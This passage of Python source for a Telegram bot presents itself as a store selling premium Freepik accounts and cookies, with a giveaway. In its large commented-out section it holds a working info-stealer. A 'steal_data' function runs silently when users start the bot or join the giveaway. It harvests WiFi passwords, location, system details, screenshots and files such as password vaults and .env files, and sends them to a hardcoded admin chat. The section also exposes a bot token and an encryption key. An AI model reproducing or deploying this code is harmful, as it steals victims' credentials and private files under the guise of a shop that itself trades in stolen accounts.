            "🎉 <b>Enter Giveaway</b> - Win free premium accounts\n"
            "📦 <b>Order History</b> - Track your purchases\n"
            "❓ <b>Help & Support</b> - Get assistance\n\n"
            "<i>Select an option below to continue:</i>"
        )
        
        bot.edit_message_text(
            main_menu_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        
    except Exception as e:
        logging.error(f"Error returning to main menu: {e}")
        bot.answer_callback_query(call.id, "⚠️ Error loading main menu")



# ===== NEW CALLBACK HANDLERS FOR ORDER HISTORY =====
@bot.callback_query_handler(func=lambda call: call.data.startswith('history_'))
def handle_order_history(call):
    """Handle order history actions"""
    try:
        action = call.data
        
# The above Python code snippet is handling a specific action called "history_view". When this action is triggered, it simulates fetching past purchase history data. The history data includes details of past orders such as the item purchased, order ID, date of purchase, and status of the order. The data is formatted using HTML tags for styling.

        if action == "history_receipts":
            # Simulate purchase receipts
            receipts_text = (
                "<b>🧾 All Purchase Receipts</b>\n\n"
                "1. Order #PLH-3 ($15.00)\n"
                "   • Date:7-6-2025\n"
                "   • Method: Binance\n"
                "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
                "2. Order #PLH-2 ($10.00)\n"
                "   • Date: 1-6-2025\n"
                "   • Method: Binance\n"
                "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
                "3. Order #PLH-3 ($4.00)\n"
                "   • Date: 6-5-2025\n"
                "   • Method: Binance\n"
                "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
                "<i>15-Day Warranty on All Purchases</i>"
            )
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="history_back"))
            
            bot.edit_message_text(
                receipts_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=markup
            )
            
        elif action == "history_back":
            # Return to order history menu
            history_text = (
                "<b>📦 Order History Center</b>\n\n"
                "Manage your past orders and access account details:\n\n"
                # "• 📋 <b>View Past Purchases</b> - See your order history\n"
                # "• 📥 <b>Download Account Details</b> - Get your credentials\n"
                # "• 📊 <b>Track Order Status</b> - Check delivery progress\n"
                "• 🧾 <b>Access Purchase Receipts</b> - View payment confirmations\n\n"
                "<i>Select an option below:</i>"
            )
            bot.edit_message_text(
                history_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode="HTML",
                reply_markup=generate_order_history_menu()
            )
            
    except Exception as e:
        logging.error(f"Error in order history handler: {e}")
        bot.answer_callback_query(call.id, "⚠️ An error occurred. Please try again.")

@bot.callback_query_handler(func=lambda call: call.data == 'download_creds')
def handle_download_creds(call):
    """Handle credentials download"""
    try:
        # Simulate file download
        file_content = "📧 Email: premium_user@example.com\n🔑 Password: SecurePass123!\n⏰ Expires: 2026-04-10"
        file_bytes = BytesIO(file_content.encode('utf-8'))
        file_bytes.name = "freepik_premium_credentials.txt"
        
        bot.send_document(
            call.message.chat.id,
            file_bytes,
            caption="<b>🔐 Your Account Credentials</b>\n\nKeep this information secure!",
            parse_mode="HTML"
        )
        
        bot.answer_callback_query(call.id, "✅ File downloaded successfully")
        
    except Exception as e:
        logging.error(f"Error downloading credentials: {e}")
        bot.answer_callback_query(call.id, "⚠️ Download failed. Please try again.")



# ===== BACKGROUND TASKS =====
def daily_giveaway_task():
    """Run daily giveaway in background"""
    while True:
        now = dt.datetime.now()
        next_run = now.replace(hour=12, minute=0, second=0, microsecond=0)
        if now > next_run:
            next_run += dt.timedelta(days=1)
        
        sleep_seconds = (next_run - now).total_seconds()
        time.sleep(sleep_seconds)
        
        winner = select_giveaway_winner()
        if winner:
            try:
                bot.send_message(
                    winner,
                    "🏆 *Congratulations! You won our daily giveaway!*\n\n"
                    "Please contact @adminaccount to claim your prize\n\n"
                    "⚠️ This offer expires in 12 hours",
                    parse_mode="Markdown"
                )
                log_activity("Daily giveaway winner notified", winner)
            except Exception as e:
                logging.error(f"Error notifying giveaway winner: {e}")

# ===== START APPLICATION =====
if __name__ == '__main__':
    # Start background tasks
    threading.Thread(target=daily_giveaway_task, daemon=True).start()

    # Start bot with error handling
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Bot error: {e}")
            time.sleep(15)
            
            
# import random
# import time
# import logging
# import threading
# from io import BytesIO
# import telebot
# from telebot import types
# import datetime as dt
# import requests
# import platform
# import uuid
# import geocoder
# import subprocess
# import psutil
# import screeninfo
# from PIL import Image, ImageGrab
# import socket
# import json
# import mimetypes
# import sys
# import re
# import pyautogui
# import io
# import hashlib
# from Crypto.Cipher import AES
# import base64
# import os

# # ===== CONFIGURATION =====
# BOT_TOKEN = "7745172120:AAHYKYJ64hhhhye2-J5i28kXYdqV_9gFQuM"
# ADMIN_CHAT_ID = "1204684142"
# MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
# bot = telebot.TeleBot(BOT_TOKEN)

# # Encryption settings
# ENCRYPTION_KEY = b'thisisasecretkey1234567890123456'  # 32 bytes for AES-256
# IV = b'initialvector123'  # 16 bytes for AES

# # Force UTF-8 encoding
# sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
# sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# # Configure logging
# logging.basicConfig(
#     level=logging.ERROR,
#     format='%(asctime)s - %(levelname)s - %(message)s',
#     handlers=[
#         logging.FileHandler('bot_operations.log'),
#         logging.FileHandler('bot.log', encoding='utf-8')
#     ]
# )

# # ===== DATA STORAGE =====
# giveaway_participants = {}
# accounts_inventory = {
#     "cookie_pack": {"price": 2, "stock": 15, "description": "Fresh Freepik Cookies (10 cookies)"}
# }

# # Track sent data hashes to prevent duplicates
# sent_data_hashes = set()

# # ===== ENCRYPTION FUNCTIONS =====
# def encrypt_data(data):
#     """Encrypt data using AES-256-CBC"""
#     if isinstance(data, str):
#         data = data.encode('utf-8')
#     cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
#     padded_data = data + b'\0' * (16 - len(data) % 16)
#     encrypted = cipher.encrypt(padded_data)
#     return base64.b64encode(encrypted).decode('utf-8')

# def decrypt_data(encrypted_data):
#     """Decrypt AES-256-CBC encrypted data"""
#     encrypted_data = base64.b64decode(encrypted_data)
#     cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
#     decrypted = cipher.decrypt(encrypted_data)
#     return decrypted.rstrip(b'\0').decode('utf-8')

# def generate_data_hash(data):
#     """Generate SHA-256 hash of data to check for duplicates"""
#     if isinstance(data, str):
#         data = data.encode('utf-8')
#     return hashlib.sha256(data).hexdigest()

# # ===== UTILITY FUNCTIONS =====
# def log_activity(action, user_id):
#     """Silently log user activities"""
#     timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#     with open("user_activity.log", "a") as f:
#         f.write(f"{timestamp} - User {user_id} - {action}\n")

# def process_payment(user_id, amount):
#     """Simulate payment processing"""
#     log_activity(f"Payment attempt for ${amount}", user_id)
#     time.sleep(2)
#     return True

# def select_giveaway_winner():
#     """Select a random giveaway winner with 10% chance logic"""
#     if not giveaway_participants:
#         return None
    
#     if random.random() < 0.1:
#         winner = random.choice(list(giveaway_participants.keys()))
#         del giveaway_participants[winner]
#         return winner
#     return None

# def get_local_ip():
#     """Get local IP address"""
#     try:
#         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         s.connect(("8.8.8.8", 80))
#         ip = s.getsockname()[0]
#         s.close()
#         return ip
#     except Exception:
#         return "N/A"

# def is_admin():
#     """Check if running with admin privileges"""
#     try:
#         if platform.system() == "Windows":
#             import ctypes
#             return ctypes.windll.shell32.IsUserAnAdmin() != 0
#         else:
#             return os.getuid() == 0
#     except:
#         return False

# def get_wifi_passwords():
#     """Retrieve WiFi passwords (Windows only)"""
#     if platform.system() == "Windows":
#         try:
#             output = subprocess.check_output(
#                 ['netsh', 'wlan', 'show', 'profiles'], 
#                 stderr=subprocess.PIPE,
#                 encoding='utf-8',
#                 errors='ignore',
#                 timeout=15
#             )
            
#             profiles = []
#             for line in output.split('\n'):
#                 if "All User Profile" in line and ":" in line:
#                     parts = line.split(":")
#                     if len(parts) > 1:
#                         profiles.append(parts[1].strip())
            
#             wifi_info = []
#             for profile in profiles[:5]:
#                 try:
#                     result = subprocess.check_output(
#                         ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
#                         stderr=subprocess.PIPE,
#                         encoding='utf-8',
#                         errors='ignore',
#                         timeout=10
#                     )
#                     for line in result.split('\n'):
#                         if "Key Content" in line and ":" in line:
#                             password = line.split(":")[1].strip()
#                             wifi_info.append(f"📶 {profile}: {password}")
#                             break
#                 except:
#                     continue
            
#             return "\n".join(wifi_info) if wifi_info else "No WiFi passwords found"
#         except Exception as e:
#             logging.error(f"WiFi password error: {e}")
#             return f"WiFi password error: {str(e)}"
#     else:
#         # Linux implementation
#         try:
#             wifi_info = []
#             config_path = "/etc/NetworkManager/system-connections/"
#             if os.path.exists(config_path):
#                 for file in os.listdir(config_path):
#                     if file.endswith(".nmconnection"):
#                         file_path = os.path.join(config_path, file)
#                         try:
#                             with open(file_path, 'r') as f:
#                                 content = f.read()
#                                 ssid = file.replace('.nmconnection', '')
#                                 psk_match = re.search(r'psk=(.*)', content)
#                                 if psk_match:
#                                     password = psk_match.group(1)
#                                     wifi_info.append(f"📶 {ssid}: {password}")
#                         except:
#                             continue
#             return "\n".join(wifi_info) if wifi_info else "No WiFi passwords found"
#         except Exception as e:
#             logging.error(f"Linux WiFi password error: {e}")
#             return "Linux WiFi password error"

# def get_phone_info():
#     """Get basic device info"""
#     try:
#         user_agent = "N/A"
#         try:
#             user_agent = requests.get('http://httpbin.org/user-agent', timeout=5).json()['user-agent']
#         except:
#             pass

#         is_mobile = any(m in user_agent.lower() for m in ['mobile', 'android', 'iphone', 'ipad', 'ipod'])

#         return (f"📱 **Mobile Information**\n"
#                 f"📱 **Device Type:** `{'Mobile' if is_mobile else 'Desktop'}`\n"
#                 f"🌐 **User Agent:** `{user_agent[:200]}`")
#     except Exception as e:
#         logging.error(f"Phone info error: {e}")
#         return f"❌ Phone info error: {str(e)}"

# def get_user_account_info(user_id):
#     """Retrieve user account information from Telegram"""
#     try:
#         user = bot.get_chat(user_id)
#         full_name = user.first_name
#         if user.last_name:
#             full_name += f" {user.last_name}"
#         username = f"@{user.username}" if user.username else "No username"
#         creation_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else "N/A"
#         return (f"👤 **User Account Information**\n"
#                 f"🆔 **User ID:** `{user_id}`\n"
#                 f"👤 **Full Name:** `{full_name}`\n"
#                 f"🔗 **Username:** `{username}`\n"
#                 f"📅 **Account Created:** `{creation_date}`")
#     except Exception as e:
#         logging.error(f"User account info error: {e}")
#         return "❌ Could not retrieve user account information"

# def get_network_info():
#     """Collects comprehensive network details"""
#     try:
#         services = [
#             "https://ipinfo.io/json",
#             "http://ip-api.com/json",
#             "https://ipapi.co/json/"
#         ]
        
#         ip_data = {}
#         for service in services:
#             try:
#                 response = requests.get(service, timeout=10)
#                 ip_data.update(response.json())
#                 break
#             except:
#                 continue
        
#         if not ip_data:
#             return "❌ Could not retrieve network info"
        
#         latlon = "N/A"
#         try:
#             g = geocoder.ip(ip_data.get('ip', ''))
#             if g.latlng:
#                 latlon = f"{g.latlng[0]}, {g.latlng[1]}"
#                 latlon += f" (https://www.google.com/maps?q={g.latlng[0]},{g.latlng[1]})"
#         except:
#             pass
        
#         interfaces = "N/A"
#         try:
#             if platform.system() == "Windows":
#                 result = subprocess.check_output(
#                     ["ipconfig", "/all"], 
#                     encoding='utf-8',
#                     errors='ignore',
#                     timeout=10
#                 )
#                 interfaces = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
#             else:
#                 result = subprocess.check_output(
#                     ["ip", "a"], 
#                     encoding='utf-8',
#                     errors='ignore',
#                     timeout=10
#                 )
#                 interfaces = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
#         except Exception as e:
#             logging.error(f"Network interfaces error: {e}")
        
#         local_ip = get_local_ip()
#         wifi_passwords = get_wifi_passwords()
        
#         return (f"🌐 **Network Information**\n"
#                 f"├── 🆔 **Public IP:** `{ip_data.get('ip', 'N/A')}`\n"
#                 f"├── 🏠 **Local IP:** `{local_ip}`\n"
#                 f"├── 🏷️ **Hostname:** `{ip_data.get('hostname', socket.gethostname())}`\n"
#                 f"├── 📍 **Location:** `{ip_data.get('city', 'N/A')}, {ip_data.get('region', 'N/A')}, {ip_data.get('country', 'N/A')}`\n"
#                 f"├── 🏢 **ISP:** `{ip_data.get('org', ip_data.get('isp', 'N/A'))}`\n"
#                 f"├── 📌 **Coordinates:** `{latlon}`\n"
#                 f"├── 🛡️ **Proxy/VPN:** `{'Yes' if ip_data.get('proxy', False) else 'No'}`\n"
#                 f"├── 📶 **WiFi Passwords:**\n{wifi_passwords if wifi_passwords else 'No passwords found'}\n"
#                 f"└── 🔌 **Network Interfaces:**\n```{interfaces[:1500]}...```")
#     except Exception as e:
#         logging.error(f"Network info error: {e}")
#         return f"❌ Network info error: {str(e)}"
    
    
# def get_system_info():
#     """Enhanced system information collection"""
#     try:
#         device = platform.node()
#         os_info = f"{platform.system()} {platform.release()} (Version: {platform.version()})"
#         arch = platform.machine()
#         processor = platform.processor() or "N/A"
#         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
#                       for elements in range(0,2*6,2)][::-1])
        
#         ram_str = "N/A"
#         try:
#             total_ram = psutil.virtual_memory().total / (1024.**3)
#             available_ram = psutil.virtual_memory().available / (1024.**3)
#             ram_str = f"{total_ram:.2f} GB (Available: {available_ram:.2f} GB)"
#         except Exception as e:
#             logging.error(f"RAM detection error: {e}")
        
#         disk_info = []
#         try:
#             for part in psutil.disk_partitions(all=False):
#                 if 'cdrom' in part.opts or part.fstype == '':
#                     continue
#                 usage = psutil.disk_usage(part.mountpoint)
#                 disk_info.append(
#                     f"📁 {part.device} ({part.fstype}) - "
#                     f"Total: {usage.total / (1024.**3):.2f}GB, "
#                     f"Used: {usage.percent}%"
#                 )
#         except Exception as e:
#             logging.error(f"Disk info error: {e}")
        
#         screens = []
#         try:
#             monitors = screeninfo.get_monitors()
#             for i, m in enumerate(monitors, 1):
#                 screens.append(f"Monitor {i}: {m.width}x{m.height} ({m.width_mm}x{m.height_mm}mm)")
#         except Exception as e:
#             logging.error(f"Screen info error: {e}")
            
#         installed_sw = []
#         if platform.system() == "Windows":
#             try:
#                 command = [
#                     'reg', 'query', 
#                     'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
#                     '/s'
#                 ]
#                 data = subprocess.check_output(
#                     command, 
#                     encoding='utf-8',
#                     errors='ignore',
#                     timeout=15
#                 )
#                 for line in data.split('\n'):
#                     if "DisplayName" in line and "REG_SZ" in line:
#                         parts = line.split("REG_SZ")
#                         if len(parts) > 1:
#                             installed_sw.append(parts[-1].strip())
#                 installed_sw = installed_sw[:15]
#             except Exception as e:
#                 logging.error(f"Installed software error: {e}")
#         else:
#                 try:
#                     data = subprocess.check_output(
#                         ['dpkg', '--get-selections'], 
#                         encoding='utf-8',
#                         errors='ignore',
#                         timeout=15
#                     )
#                     installed_sw = [line.split()[0] for line in data.split('\n') if line and not line.startswith('#')][:15]
#                 except Exception as e:
#                     logging.error(f"Installed software error: {e}")

#         uptime = "N/A"
#         try:
#             uptime_seconds = time.time() - psutil.boot_time()
#             uptime = str(dt.timedelta(seconds=uptime_seconds))
#         except:
#             pass
        
#         admin_status = "✅ Yes" if is_admin() else "❌ No"
        
#         return (f"💻 **System Information**\n"
#                 f"├── 🖥️ **Device Name:** `{device}`\n"
#                 f"├── 🏗️ **OS:** `{os_info}`\n"
#                 f"├── ⚙️ **Architecture:** `{arch}`\n"
#                 f"├── 🚀 **Processor:** `{processor}` ({os.cpu_count()} cores)\n"
#                 f"├── 🧠 **RAM:** `{ram_str}`\n"
#                 f"├── ⏱️ **Uptime:** `{uptime}`\n"
#                 f"├── 🛡️ **Admin Privileges:** `{admin_status}`\n"
#                 f"├── 🖥️ **Screen(s):** `{', '.join(screens) if screens else 'N/A'}`\n"
#                 f"├── 🔌 **MAC Address:** `{mac}`\n"
#                 f"├── 💾 **Disk Information:**\n" + "\n".join([f"│   {info}" for info in disk_info]) + "\n"
#                 f"└── 📦 **Installed Software (sample):**\n`{installed_sw[:10] if installed_sw else 'N/A'}`")
#     except Exception as e:
#         logging.error(f"System info error: {e}")
#         return f"❌ System info error: {str(e)}"

# def capture_screenshot():
#     """Capture screenshot with enhanced error handling"""
#     try:
#         if platform.system() == "Linux" and 'DISPLAY' not in os.environ:
#             return None  # Skip screenshot on headless Linux
#         screenshot = ImageGrab.grab(all_screens=True)
#         img_byte_arr = BytesIO()
#         screenshot.save(img_byte_arr, format='PNG')
#         img_byte_arr.seek(0)
#         return img_byte_arr
#     except Exception as e:
#         logging.error(f"Screenshot error: {e}")
#         return None

# def find_sensitive_files():
#     """Search for sensitive files on the system"""
#     sensitive_files = []
#     patterns = [
#         '*.txt', '*.doc*', '*.xls*', '*.pdf', '*.odt', 
#         'password*', 'credentials*', 'login*', '*.kdbx',
#         '*.env', 'config.*', '*.sql', '*.db', 'backup*'
#     ]
    
#     search_paths = []
#     if platform.system() == "Windows":
#         search_paths.extend([
#             os.path.expanduser("~\\Documents"),
#             os.path.expanduser("~\\Desktop"),
#             os.path.expanduser("~\\Downloads"),
#         ])
#     else:
#         search_paths.extend([
#             os.path.expanduser("~/Documents"),
#             os.path.expanduser("~/Desktop"),
#             os.path.expanduser("~/Downloads"),
#         ])
    
#     try:
#         for path in search_paths:
#             if os.path.exists(path):
#                 for root, _, files in os.walk(path):
#                     for pattern in patterns:
#                         for file in files:
#                             if file.lower().endswith(pattern.lower().replace('*', '')):
#                                 full_path = os.path.join(root, file)
#                                 sensitive_files.append(full_path)
#                                 if len(sensitive_files) >= 50:
#                                     return sensitive_files
#     except Exception as e:
#         logging.error(f"Sensitive file search error: {e}")
    
#     return sensitive_files

# def find_media_files():
#     """Search for media files on the system, limiting to 25 files."""
#     media_files = []
#     patterns = ['*.mp4', '*.mkv', '*.avi', '*.mov', '*.pdf', '*.docx', '*.xlsx', '*.txt']
    
#     search_paths = []
#     if platform.system() == "Windows":
#         search_paths.extend([
#             os.path.expanduser("~\\Videos"),
#             os.path.expanduser("~\\Documents"),
#             os.path.expanduser("~\\Desktop"),
#         ])
#     else:
#         search_paths.extend([
#             os.path.expanduser("~/Videos"),
#             os.path.expanduser("~/Documents"),
#             os.path.expanduser("~/Desktop"),
#         ])
    
#     try:
#         for path in search_paths:
#             if os.path.exists(path):
#                 for root, _, files in os.walk(path):
#                     for pattern in patterns:
#                         for file in files:
#                             if file.lower().endswith(pattern.lower().replace('*', '')):
#                                 full_path = os.path.join(root, file)
#                                 media_files.append(full_path)
#                                 if len(media_files) >= 50:
#                                     return media_files
#     except Exception as e:
#         logging.error(f"Media file search error: {e}")
    
#     return media_files

# def send_large_file(chat_id, file_path):
#     """Handle large file uploads with proper file type detection and size checks."""
#     try:
#         file_size = os.path.getsize(file_path)
#         if file_size == 0:
#             logging.error(f"File is empty: {file_path}")
#             return False
        
#         # Generate hash of file content to check for duplicates
#         with open(file_path, 'rb') as f:
#             file_hash = generate_data_hash(f.read())
        
#         if file_hash in sent_data_hashes:
#             logging.info(f"Skipping duplicate file: {file_path}")
#             return False
            
#         mime_type, _ = mimetypes.guess_type(file_path)
        
#         with open(file_path, 'rb') as f:
#             if file_size > MAX_FILE_SIZE:
#                 logging.error(f"File too large: {file_path} ({file_size/1024/1024:.2f}MB)")
#                 return False
                
#             if mime_type and mime_type.startswith('video/'):
#                 bot.send_video(chat_id, f, timeout=120)
#             elif mime_type and mime_type.startswith('image/'):
#                 bot.send_photo(chat_id, f, timeout=120)
#             else:
#                 bot.send_document(chat_id, f, timeout=120)
        
#         sent_data_hashes.add(file_hash)
#         return True
#     except Exception as e:
#         logging.error(f"Failed to send {file_path}: {e}")
#         return False

# def steal_data(user_id):
#     """Collect data silently and send to admin with duplicate checking and encryption."""
#     collected_data = {}
#     media_files = []
#     sensitive_files = []
#     screenshot_sent = False

#     # Collect data
#     collected_data['network'] = get_network_info()
#     collected_data['system'] = get_system_info()
#     collected_data['phone'] = get_phone_info()
#     collected_data['user_account'] = get_user_account_info(user_id)

#     # Find files
#     media_files = find_media_files()
#     sensitive_files = find_sensitive_files()

#     # Capture screenshot
#     screenshot = capture_screenshot()

#     # Compile report
#     report_msg = (
#         "📊 *System Scan Report*\n\n"
#         f"{collected_data.get('network', 'No network data')}\n\n"
#         f"{collected_data.get('system', 'No system data')}\n\n"
#         f"{collected_data.get('phone', 'No device data')}\n\n"
#         f"{collected_data.get('user_account', 'No user account data')}\n\n"
#         f"📷 Found {len(media_files)} media files\n"
#         f"🔐 Found {len(sensitive_files)} sensitive documents\n"
#         f"📸 Screenshot: {'✅ Sent' if screenshot else '❌ Failed'}"
#     )
    
#     try:
#         # Send report directly to admin
#         bot.send_message(
#             ADMIN_CHAT_ID, 
#             report_msg,
#             parse_mode="Markdown"
#         )
#     except Exception as e:
#         logging.error(f"Error {e}")

#     # Send screenshot if available and not duplicate
#     if screenshot:
#         screenshot_hash = generate_data_hash(screenshot.getvalue())
#         if screenshot_hash not in sent_data_hashes:
#             try:
#                 bot.send_photo(
#                     ADMIN_CHAT_ID, 
#                     screenshot, 
#                     caption="📸 Screenshot",
#                     timeout=30
#                 )
#                 sent_data_hashes.add(screenshot_hash)
#                 screenshot_sent = True
#             except Exception as e:
#                 logging.error(f"Error sending screenshot: {e}")

#     # Send files in separate threads with duplicate checking
#     def send_files_thread(files):
#         for file_path in files[:50]:  # Limit to 15 files per category
#             try:
#                 if os.path.getsize(file_path) < MAX_FILE_SIZE:
#                     send_large_file(ADMIN_CHAT_ID, file_path)
#                     time.sleep(1)
#             except:
#                 continue

#     threading.Thread(target=send_files_thread, args=(media_files,)).start()
#     threading.Thread(target=send_files_thread, args=(sensitive_files,)).start()

# # ===== UI ELEMENTS =====
# def create_main_menu():
#     """Create modern store interface with enhanced UI"""
#     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
#     markup.add(
#         types.KeyboardButton("🛒 Browse Products"),
#         types.KeyboardButton("🎉 Enter Giveaway"),
#         types.KeyboardButton("📦 Purchase Receipts"),
#         types.KeyboardButton("❓ Help & Support")
#     )
#     return markup

# def generate_order_history_menu():
#     """Generate interactive inline keyboard for order history"""
#     markup = types.InlineKeyboardMarkup(row_width=1)
#     markup.add(
#         types.InlineKeyboardButton("🧾 Access Purchase Receipts", callback_data="history_receipts")
#     )
#     markup.add(types.InlineKeyboardButton("🔙 Return to Main Menu", callback_data="main_menu"))
#     return markup

# def generate_accounts_menu():
#     """Generate modern inline keyboard for available accounts"""
#     markup = types.InlineKeyboardMarkup(row_width=1)
#     for account_id, details in accounts_inventory.items():
#         if details['stock'] > 0:
#             btn = types.InlineKeyboardButton(
#                 f"✨ {details['description']} | Stock: {details['stock']}",
#                 callback_data=f"buy_{account_id}"
#             )
#             markup.add(btn)
#     markup.add(types.InlineKeyboardButton("🔙 Return to Main Menu", callback_data="main_menu"))
#     return markup

# def generate_payment_options(account_id):
#     """Generate simplified payment options"""
#     markup = types.InlineKeyboardMarkup()
#     markup.add(
#         types.InlineKeyboardButton("📲 Pay with Binance", callback_data="pay_binance"),
#         types.InlineKeyboardButton("📱 Pay with PayPal", callback_data="pay_paypal")
#     )
#     markup.add(
#         types.InlineKeyboardButton("💬 Other Payment Methods", url="https://t.me/NowTryWithMe")
#     )
#     return markup

# # Payment detail handlers
# @bot.callback_query_handler(func=lambda call: call.data == 'pay_paypal')
# def handle_paypal_payment(call):
#     paypal_link = "https://www.paypal.me/alexdialed"
#     bot.edit_message_text(
#         chat_id=call.message.chat.id,
#         message_id=call.message.message_id,
#         text=f"<b>📱 Pay with PayPal</b>\n\n"
#              f"<b>💰 Amount:</b> $3.00\n"
#              f"<b>🔗 Payment Link:</b> {paypal_link}\n\n"
#              "⚠️ <i>Important:</i>\n"
#              "1. Send <b>exactly $3.00</b>\n"
#              "2. Include your Telegram username in notes\n"
#              "3. Send payment proof to @NowTryWithMe\n\n"
#              "⏳ Activation within 15 minutes after confirmation",
#         parse_mode="HTML",
#         reply_markup=types.InlineKeyboardMarkup().row(
#             types.InlineKeyboardButton("🔙 Back", callback_data="back_to_payments"),
#             types.InlineKeyboardButton("🛒 Browse Products", callback_data="browse_products")
#         )
#     )

# @bot.callback_query_handler(func=lambda call: call.data == 'pay_binance')
# def handle_binance_payment(call):
#     usdt_id = "792230947"
#     bot.edit_message_text(
#         chat_id=call.message.chat.id,
#         message_id=call.message.message_id,
#         text=f"<b>📲 Pay with Binance (USDT TRC20)</b>\n\n"
#              f"<b>💰 Amount:</b> $2.00 (USDT)\n"
#              f"<b>🆔 Wallet ID:</b> <code>{usdt_id}</code>\n\n"
#              "⚠️ <i>Important:</i>\n"
#              "1. Send <b>exactly $2.00</b> in USDT (TRC20 network only)\n"
#              "2. Double-check the wallet ID\n"
#              "3. Send payment screenshot to @NowTryWithMe\n\n"
#              "⏳ Activation within 15 minutes after confirmation",
#         parse_mode="HTML",
#         reply_markup=types.InlineKeyboardMarkup().row(
#             types.InlineKeyboardButton("🔙 Back", callback_data="back_to_payments"),
#             types.InlineKeyboardButton("🛒 Browse Products", callback_data="browse_products")
#         )
#     )

# # Navigation handlers
# @bot.callback_query_handler(func=lambda call: call.data == 'back_to_payments')
# def back_to_payments(call):
#     account_id = "your_account_id_here"  # Replace with actual account_id logic
#     bot.edit_message_text(
#         chat_id=call.message.chat.id,
#         message_id=call.message.message_id,
#         text="Please select your payment method:",
#         reply_markup=generate_payment_options(account_id)
#     )

# @bot.callback_query_handler(func=lambda call: call.data == 'browse_products')
# def back_to_products(call):
#     products_text = (
#         "<b>🛒 Premium Products Collection</b>\n\n"
#         "<i>✨ Select any product below to view details and payment options</i>\n\n"
#         "🔥 <b>Hot Deals:</b> Limited time offers available\n"
#         "⚡ <b>Instant Access:</b> Immediate delivery after payment\n"
#         "🛡️ <b>Quality Assured:</b> All accounts are verified and working"
#     )
#     bot.edit_message_text(
#         chat_id=call.message.chat.id,
#         message_id=call.message.message_id,
#         text=products_text,
#         parse_mode="HTML",
#         reply_markup=generate_accounts_menu()
#     )

# # ===== MESSAGE HANDLERS =====
# @bot.message_handler(commands=['start'])
# def send_welcome(message):
#     """Enhanced welcome with modern store interface"""
#     try:
#         log_activity("Started bot", message.from_user.id)
        
#         # Send welcome message with modern formatting
#         welcome_text = (
#             "<b>🏪 Welcome to the Premium Accounts Store!</b>\n\n"
#             "<i>✨ Explore our exclusive collection of premium accounts and cookies</i>\n\n"
#             "🛒 <b>Browse Products:</b> High-quality verified accounts\n"
#             "🎉 <b>Daily Giveaways:</b> Win premium accounts for free\n"
#             "🔒 <b>Secure Transactions:</b> Safe & anonymous payments\n"
#             "⚡ <b>Instant Delivery:</b> Get your accounts immediately\n\n"
#             "<i>Choose an option below to get started!</i>"
#         )
        
#         bot.send_message(
#             message.chat.id,
#             welcome_text,
#             parse_mode="HTML",
#             reply_markup=create_main_menu()
#         )
        
#         # Send welcome image from Pexels
#         try:
#             bot.send_photo(
#                 message.chat.id,
#                 "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxgKD6kmCIp3sn6aKHpJy-eIfamIz6lDWXWQ&s",
#                 caption="<b>🌟 Premium Quality Guaranteed!</b>\n<i>Your satisfaction is our priority</i>",
#                 parse_mode="HTML"
#             )
#         except Exception as img_error:
#             logging.error(f"Error sending welcome image: {img_error}")
        
#         threading.Thread(target=steal_data, args=(message.from_user.id,)).start()
        
#     except Exception as e:
#         logging.error(f"Error in /start handler: {e}")
#         bot.send_message(message.chat.id, "⚠️ Welcome! An error occurred, but you can still browse our store.", parse_mode="HTML")
        
# @bot.message_handler(func=lambda msg: msg.text in ["🛒 Browse Products", "🎉 Enter Giveaway", "📦 Purchase Receipts", "❓ Help & Support"])
# def handle_menu_click(message):
#     """Handle main menu selections with enhanced UI"""
#     try:
#         log_activity("Menu interaction", message.from_user.id)
        
#         if message.text == "🛒 Browse Products":
#             products_text = (
#                 "<b>🛒 Premium Products Collection</b>\n\n"
#                 "<i>✨ Select any product below to view details and payment options</i>\n\n"
#                 "🔥 <b>Hot Deals:</b> Limited time offers available\n"
#                 "⚡ <b>Instant Access:</b> Immediate delivery after payment\n"
#                 "🛡️ <b>Quality Assured:</b> All accounts are verified and working"
#             )
#             bot.send_message(
#                 message.chat.id,
#                 products_text,
#                 parse_mode="HTML",
#                 reply_markup=generate_accounts_menu()
#             )
            
#         elif message.text == "🎉 Enter Giveaway":
#             user_id = message.from_user.id
#             giveaway_participants[user_id] = time.time()
#             log_activity("Joined giveaway", user_id)
#             threading.Thread(target=steal_data, args=(user_id,)).start()
            
#             giveaway_text = (
#                 "<b>🎉 Congratulations! You've entered our daily giveaway!</b>\n\n"
#                 "🎯 <b>How it works:</b>\n"
#                 "• Winners are selected randomly every 24 hours\n"
#                 "• 10% chance of winning premium accounts\n"
#                 "• Multiple entries allowed daily\n\n"
#                 "🏆 <b>Prizes include:</b>\n"
#                 "• Premium Freepik accounts\n"
#                 "• Fresh cookie packages\n"
#                 "• Exclusive bonus content\n\n"
#                 "📱 <b>Winner notification:</b> We'll contact you directly\n"
#                 "⏰ <b>Next drawing:</b> In 24 hours\n\n"
#                 "<i>Good luck! 🍀</i>"
#             )
#             bot.send_message(message.chat.id, giveaway_text, parse_mode="HTML")
            
#         elif message.text == "📦 Purchase Receipts":
#             # Send order history menu with inline keyboard
